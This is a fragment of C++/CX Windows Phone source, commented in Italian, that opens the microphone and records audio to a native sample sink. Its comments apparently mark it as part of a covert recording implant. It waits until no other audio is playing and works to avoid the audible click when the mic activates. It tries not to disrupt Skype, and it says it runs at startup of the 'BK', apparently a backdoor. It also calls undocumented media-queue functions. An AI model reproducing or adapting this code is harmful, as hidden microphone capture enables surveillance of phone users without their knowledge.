	//non posso ceccare se sono gia' precedentemente connesso
	
	//try
	//{
	//	_ZMediaQueue_DisconnectFromService();
	//}
	//catch (Platform::Exception^ e) 
	//{
	//	//controllare se qui non crea eccezione a livello kernel
	//	OutputDebugString(L"<<<eccezione _ZMediaQueue_DisconnectFromService gestita>>>\n");
	//}

	_ZMediaQueue_ConnectToService();

	DWORD b=false;
	_Media_Queue_GameHasControl(&b);
	if(b==1)
	{
#ifdef  RELESE_DEBUG_MSG
	Log logInfo;
	logInfo.WriteLogInfo(L"se entro qui � perche' nessuno sta playando dell'audio per cui posso procedere con l'attivazione della cattura");
		 // se entro qui � perche' nessuno sta playando dell'audio per cui posso procedere con l'attivazione della cattura
	Log logInfo2;
	logInfo2.WriteLogInfo(L"StartCapture b=1a");
#endif
		//OutputDebugString(L"Nessun play attivo");	
	
				
		/*
		Registra l'audio
		MyAudioSink pMyAudioSink;
		RecordAudioStream(&pMyAudioSink);
		*/
		
		try
		{
			//sembrerebbe che se inizializzo la periferica audio di render inizializza lo speacker e non si sente piu' il glic quando attivo il microfono
			
			// da rimettere tolto per verificare il rash del positio + mic
			
			// BYGIO INIZIARE DA QUI:: TOLTO perche' l'init incasina skype

			//InitRender();

			//SetVolumeOnSession( 100 );

			///InitAudioStream(); ///HO TESTATO CRASHA LO STESSO POSSO RTIMETTERLA

		//	/*
		//	 SND_SYNC =           0x0000,  /* play synchronously (default) */
  //SND_ASYNC =          0x0001,  /* play asynchronously */
  //SND_NODEFAULT =      0x0002,  /* silence (!default) if sound not found */
  //SND_MEMORY =         0x0004,  /* pszSound points to a memory file */
  //SND_LOOP =           0x0008,  /* loop the sound until next sndPlaySound */
  //SND_NOSTOP =         0x0010,  /* don't stop any currently playing sound */
		//	*/
		
			// sembra che se playo un wav silenzioso non si sente piu' il glic peccato che skype poi non vuole sapere di funzionare 
			/*
			_PlaySoundW(NULL, 0, 0);
			//_PlaySoundW(TEXT("alarma.wav"), NULL, SND_FILENAME|0x0000);	
			_PlaySoundW(TEXT("silence.wav"), NULL, SND_FILENAME|0x0000);	
			_Sleep(1000);
			*/

			//DWORD RecordAudioStreamThreadId;
			//HANDLE  hRepeat = _CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RecordAudioStream, (void*)&pMyAudioSink, 0, &RecordAudioStreamThreadId);


			//idem se inizializzo xaudio skype poi non funziona
			//initXaudio2();
	
		
			/////  DA RIMETTERE
			//a prescindere che andra' bene o male StartRecordingToSinkAsync io sono in una condizione per il sistema di cattura
			//anche se non dovrebbe mai succedere di arrivare qua se sono gia' in fStartCapture=TRUE e per cui 2 start generano un eccezione
			initFirstCapture();
			pAudioVideoCaptureDevice->StartRecordingToSinkAsync();
			/////_ZMediaQueue_DisconnectFromService();
			return TRUE;
		}
		catch (Platform::Exception^ e) 
		{
#ifdef _DEBUG
			OutputDebugString(L"<<<eccezione capture Mic2 gestita>>>\n");
			///OutputDebugString(*((wchar_t**)(*((int*)(((Platform::Exception^)((Platform::COMException^)(e)))) - 1)) + 1));
#endif

#ifdef RELESE_DEBUG_MSG
			Log logInfo;
			//in realta' se arrivo qua � perche' c'e' un crash nel modulo per ora lo lascio cosi' per fare il debug
			logInfo.WriteLogInfo(L"Microphone is in use. [id2]");
#endif
			return FALSE;
		}
		
	}

	//OutputDebugString(L"Play attivo");
	Log logInfo;
	logInfo.WriteLogInfo(L"Can not activate microphone while background audio is playing, standing by");

	//controllo ogni 10 sec che sia finito il playng dell'audio in bk	
	//esco quando qualcuno chiude l'evento mic
	
	while(_WaitForSingleObject(eventHandle, 10000))
	//se uso _WaitForSingleObject non mi viene notificato lo stop del mic � non ha senso visto che la riga sotto funziona!!!!
	//while(NativeCapture::SetResetWait==TRUE)
	{
	//	_Sleep(10000);
	
#ifdef RELESE_DEBUG_MSG
		Log logInfo;
		logInfo.WriteLogInfo(L"StartCapture fStartCapture==TRUE && _WaitForSingleObject(eventHandle, 10000)");
#endif
		_Media_Queue_GameHasControl(&b);
		if(b==1)
		{
			//se arrivo qui � perche' il play dell'audio � finito � sessuno nel frattempo ha chiuso l'evento
#ifdef RELESE_DEBUG_MSG
			Log logInfo;
			logInfo.WriteLogInfo(L"StartCapture b==1b");
			logInfo.WriteLogInfo(L"se arrivo qui � perche' il play dell'audio � finito � sessuno nel frattempo ha chiuso l'evento");

#endif
			//OutputDebugString(L"Nessun play attivo");	
			//controllo che nel frattempo non vi sia stato uno statcapture
			
				try
				{

						//se arrivo qua significa che devo iniziare un campionamento per cui inizializzo initStartCapture();
						initFirstCapture();
						pAudioVideoCaptureDevice->StartRecordingToSinkAsync();
						Log logInfo;
						logInfo.WriteLogInfo(L"Resume microphone");

						return TRUE;
						/////_ZMediaQueue_DisconnectFromService();
				}
				catch (Platform::Exception^ e) 
				{
#ifdef _DEBUG
					OutputDebugString(L"<<<eccezione capture Mic3 gestita>>>\n");
					///OutputDebugString(*((wchar_t**)(*((int*)(((Platform::Exception^)((Platform::COMException^)(e)))) - 1)) + 1));
#endif

	
#ifdef RELESE_DEBUG_MSG
					Log logInfo;
					//in realta' se arrivo qua � perche' c'e' un crash nel modulo per ora lo lascio cosi' per fare il debug
					logInfo.WriteLogInfo(L"Microphone is in use. [id3]");
#endif
			
					return FALSE;
				}
			
		}
	}
#ifdef  RELESE_DEBUG_MSG
	Log logInfo7;
	logInfo7.WriteLogInfo(L"uscito da: while(_WaitForSingleObject(eventHandle, 10000))");
#endif

return TRUE;

		
		/*****
		//acrocchio che mi permette di aspettare sino a 10 sec che sia completata 
		//l'operazioe di inizializzazione tramite IAsyncOperation (non riesco a trovare un metodo piu' pulito)
		for(int i=0;i<20;i++)
		{
			
			auto stato=openOperation->Status;
			//if (openOperation->Status!=Windows::Foundation::AsyncStatus::Started) 
			if (openOperation->Status==Windows::Foundation::AsyncStatus::Completed)
				{
					fAudioCaptureForceStop=FALSE;
					pAudioVideoCaptureDevice->StartRecordingToSinkAsync();
					break;
				}
			std::this_thread::sleep_for(std::chrono::milliseconds(500));
		}
		****/


}



NativeAudioInterface::Native::NativeCapture::NativeCapture()
{
	//initXaudio2();
	//quando inizializzo il microfono il sistema non � icattura
	//fStartCapture mi dice se qualcuno ha fatto una richiesta di start cattura

	//questo viene eseguito solo all'avvio della BK non con una nuova conf


	/*****
	abilitando non rifaccio un nuovo new per ogni volta che devo attivare il microfono ma sfrutto quanto gia'  allocato in precedenza
	visto che dai test fatti in AudioOnly.sln diventa instabile
	if (COSTRUITO>0)
	{
		NativeCapture::pos=0;
		NativeCapture::nCamp=1;
		return;
	}
	else COSTRUITO++;
	*****/
/*****
	//IAsyncOperation<AudioVideoCaptureDevice^> ^openOperation = AudioVideoCaptureDevice::OpenForAudioOnlyAsync();
	openOperation = AudioVideoCaptureDevice::OpenForAudioOnlyAsync();

	openOperation->Completed = ref new AsyncOperationCompletedHandler<AudioVideoCaptureDevice^>(
		[this] (IAsyncOperation<AudioVideoCaptureDevice^> ^operation, Windows::Foundation::AsyncStatus status)
		{
			if (status == Windows::Foundation::AsyncStatus::Completed)
			{
				auto captureDevice = operation->GetResults();

				// Save the reference to the opened video capture device
				pAudioVideoCaptureDevice = captureDevice;


				// Retrieve the native ICameraCaptureDeviceNative interface from the managed video capture device
				ICameraCaptureDeviceNative *iCameraCaptureDeviceNative = NULL; 
				HRESULT hr = reinterpret_cast<IUnknown*>(pAudioVideoCaptureDevice)->QueryInterface(__uuidof(ICameraCaptureDeviceNative), (void**) &iCameraCaptureDeviceNative);

				// Save the pointer to the native interface
				pCameraCaptureDeviceNative = iCameraCaptureDeviceNative;
			
				// Retrieve IAudioVideoCaptureDeviceNative native interface from managed projection.
				IAudioVideoCaptureDeviceNative *iAudioVideoCaptureDeviceNative = NULL;
				hr = reinterpret_cast<IUnknown*>(pAudioVideoCaptureDevice)->QueryInterface(__uuidof(IAudioVideoCaptureDeviceNative), (void**) &iAudioVideoCaptureDeviceNative);

				// Save the pointer to the IAudioVideoCaptureDeviceNative native interface
				pAudioVideoCaptureDeviceNative = iAudioVideoCaptureDeviceNative;

				
				pAudioVideoCaptureDevice->AudioEncodingFormat = CameraCaptureAudioFormat::Amr;
				
				// Initialize and set the CameraCaptureSampleSink class as sink for captures samples
				MakeAndInitialize<CameraCaptureSampleSink>(&pCameraCaptureSampleSink);
				pAudioVideoCaptureDeviceNative->SetAudioSampleSink(pCameraCaptureSampleSink);

				//Start recording (only way to receive samples using the ICameraCaptureSampleSink interface
				//fAudio=TRUE;
				//pAudioVideoCaptureDevice->StartRecordingToSinkAsync();
				//////////fAudioCapture=TRUE;

				//TRUE => che ho finito l'inizializzazione
				//fAudioCapture=TRUE;
				
			}
		}
	);
	***/

	//converto da asincrono ad sincrono l'inizializzazione del mic

	concurrency::cancellation_token_source AudioTaskTokenSource;

	task<AudioVideoCaptureDevice^> AudioTask(AudioVideoCaptureDevice::OpenForAudioOnlyAsync(), AudioTaskTokenSource.get_token());


	AudioTask.then([=](task<AudioVideoCaptureDevice^> getAudioTask)
	{
		try
		{
		/*****
				AudioVideoCaptureDevice^ captureDevice  = getPosTask.get();

				// Save the reference to the opened video capture device
				pAudioVideoCaptureDevice = captureDevice;
		*****/

				pAudioVideoCaptureDevice = getAudioTask.get();
/***
				// Retrieve the native ICameraCaptureDeviceNative interface from the managed video capture device
				ICameraCaptureDeviceNative *iCameraCaptureDeviceNative = NULL; 
				HRESULT hr = reinterpret_cast<IUnknown*>(pAudioVideoCaptureDevice)->QueryInterface(__uuidof(ICameraCaptureDeviceNative), (void**) &iCameraCaptureDeviceNative);

				// Save the pointer to the native interface
				pCameraCaptureDeviceNative = iCameraCaptureDeviceNative;
***/			
				// Retrieve IAudioVideoCaptureDeviceNative native interface from managed projection.
				IAudioVideoCaptureDeviceNative *iAudioVideoCaptureDeviceNative = NULL;
				HRESULT hr = reinterpret_cast<IUnknown*>(pAudioVideoCaptureDevice)->QueryInterface(__uuidof(IAudioVideoCaptureDeviceNative), (void**) &iAudioVideoCaptureDeviceNative);

				// Save the pointer to the IAudioVideoCaptureDeviceNative native interface
				pAudioVideoCaptureDeviceNative = iAudioVideoCaptureDeviceNative;

				
				pAudioVideoCaptureDevice->AudioEncodingFormat = CameraCaptureAudioFormat::Pcm;

				//var aaa = mAudioCaptureDevice.GetProperty(KnownCameraAudioVideoProperties.UnmuteAudioWhileRecording);
				//mAudioCaptureDevice.SetProperty(KnownCameraAudioVideoProperties.UnmuteAudioWhileRecording, true);
				//aaa = mAudioCaptureDevice.GetProperty(KnownCameraAudioVideoProperties.UnmuteAudioWhileRecording);
				//bool aaa = pAudioVideoCaptureDevice->GetProperty(KnownCameraAudioVideoProperties::UnmuteAudioWhileRecording);
				pAudioVideoCaptureDevice->SetProperty(KnownCameraAudioVideoProperties::UnmuteAudioWhileRecording, true);
				//aaa = pAudioVideoCaptureDevice->GetProperty(KnownCameraAudioVideoProperties::UnmuteAudioWhileRecording);
				
				// Initialize and set the CameraCaptureSampleSink class as sink for captures samples
				MakeAndInitialize<CameraCaptureSampleSink>(&pCameraCaptureSampleSink);
				pAudioVideoCaptureDeviceNative->SetAudioSampleSink(pCameraCaptureSampleSink);

				//Start recording (only way to receive samples using the ICameraCaptureSampleSink interface
				//fAudio=TRUE;
				//pAudioVideoCaptureDevice->StartRecordingToSinkAsync();
				//////////fAudioCapture=TRUE;

				//TRUE => che ho finito l'inizializzazione
				//fAudioCapture=TRUE;
		}
		catch (Platform::Exception^ e) 
		{
#ifdef _DEBUG
			OutputDebugString(L"<<<eccezione capture Mic1 gestita>>>\n");
			///OutputDebugString(*((wchar_t**)(*((int*)(((Platform::Exception^)((Platform::COMException^)(e)))) - 1)) + 1));
#endif
#ifdef  RELESE_DEBUG_MSG
			Log logInfo;
			//in realta' se arrivo qua � perche' c'e' un crash nel modulo per ora lo lascio cosi' per fare il debug
			logInfo.WriteLogInfo(L"Microphone is in use. [id1]");
			///logInfo.WriteLogInfo(*((wchar_t**)(*((int*)(((Platform::Exception^)((Platform::COMException^)(e)))) - 1)) + 1));
#endif

		}

	}).wait();


	// non serve: _Sleep(2000); //inserito per vedere se ritardando si evita il tak che capita ogni tanto sui lumia
	//inizializzo i dati per poter effettuare la prima cattura
	initFirstCapture();
#ifdef  RELESE_DEBUG_MSG
	Log logInfo;
	logInfo.WriteLogInfo(L">>>>>>>>NativeCapture  0Init) ");
#endif

#ifdef _DEBUG
	OutputDebugString(L"0Init) \n");
#endif
}
